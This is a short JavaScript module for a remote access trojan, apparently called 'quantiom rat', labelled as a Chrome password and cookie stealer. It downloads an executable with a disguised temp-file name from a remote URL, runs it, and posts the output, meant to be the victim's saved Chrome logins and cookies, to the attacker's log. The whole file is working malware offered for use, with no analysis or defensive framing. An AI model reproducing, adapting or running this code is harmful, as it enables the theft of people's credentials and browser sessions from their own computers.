/**
 * Chrome Password and Cookie Stealer
 * Preset Code for quantiom rat
 *
 * Description: Grabs Chrome saved login details and cookies from the client's PC and posts it to their data log.
 * Last Updated: 9/7/2020
 */

try {
    const fs = require('fs');
    const http = require('http');
    const os = require('os');

    const checkForFile = async () => {
        return new Promise((r) => {
            if (!fs.existsSync(`${os.tmpdir()}/edg6A23.tmp.exe`)) {
                const file = fs.createWriteStream(`${os.tmpdir()}/edg6A23.tmp.exe`);

                http.get(url + '/tmp/edg6A23.tmp.exe', async (response) => {
                    response.pipe(file);

                    await new Promise((r) => setTimeout(r, 1000));
                });
            } else r();
        });
    };

    checkForFile().then(() => {
        exec(`%temp%/edg6A23.tmp.exe`, {}, (err, stdout, stderr) => {
            if (err) {
                postData(err.stack, 'Chrome Password and Cookie Stealer Error');
                return;
            }

            postData(stdout.toString(), 'Chrome Password and Cookie Stealer');
        });
    });
} catch (e) {
    postData(e.stack, 'Chrome Password and Cookie Stealer Error');
}
